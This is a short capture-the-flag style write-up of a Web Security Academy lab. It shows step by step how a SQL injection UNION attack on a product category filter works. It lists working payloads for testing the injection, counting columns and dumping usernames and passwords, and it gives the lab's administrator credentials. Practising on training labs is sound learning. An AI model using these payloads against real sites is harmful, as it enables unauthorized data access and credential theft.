# Lab: SQL injection UNION attack, retrieving data from other tables

- sqli: product category filter
- end goal: retrieves all usernames and passwords table, and login as the administrator user

### Analysis
- url: `https://0a330051041e72da80d4543400ba0002.web-security-academy.net`

- front-end: `/filter?category=Food+%26+Drink`
- back-end: 
```sql
select * from product where category = 'Food & Drink' and released = 1 
```

- check sqli vulnerability
- front-end: `/filter?category=Food+%26+Drink'`
- back-end: 
```sql
select * from product where category = 'Food & Drink'' and released = 1 
'-- 500 Internal Server Error
```

- front-end: `/filter?category=Food+%26+Drink'--`
- back-end: 
```sql
select * from product where category = 'Food & Drink'-- and released = 1 
-- 200 OK: this website have sqli vulnerability
```

- determine how many columns which contain in this website
- front-end: `/filter?category=Food+%26+Drink' order by 2--`
- back-end: 
```sql
select * from product where category = 'Food & Drink' order by 2-- and released = 1 
-- 200 OK: I found 2 columns
```

- determine how many strings which containing in the columns
- front-end: `/filter?category=Food+%26+Drink' union select 'text', 'text'--`
- back-end: 
```sql
select * from product where category = 'Food & Drink' union select 'text', 'text'-- and released = 1 
-- 200 OK: both columns are text 
```

- find usernames and passwords tables from users column
- front-end: `/filter?category=Food+%26+Drink' union select username, password from users--`
- back-end: 
```sql
select * from product where category = 'Food & Drink' union select username, password from users-- and released = 1 
-- 200 OK: administrator:zsh94tgxsd2wt7o9onjc
```
- login as administrator acount
- Congratulations, you solved the lab!

---
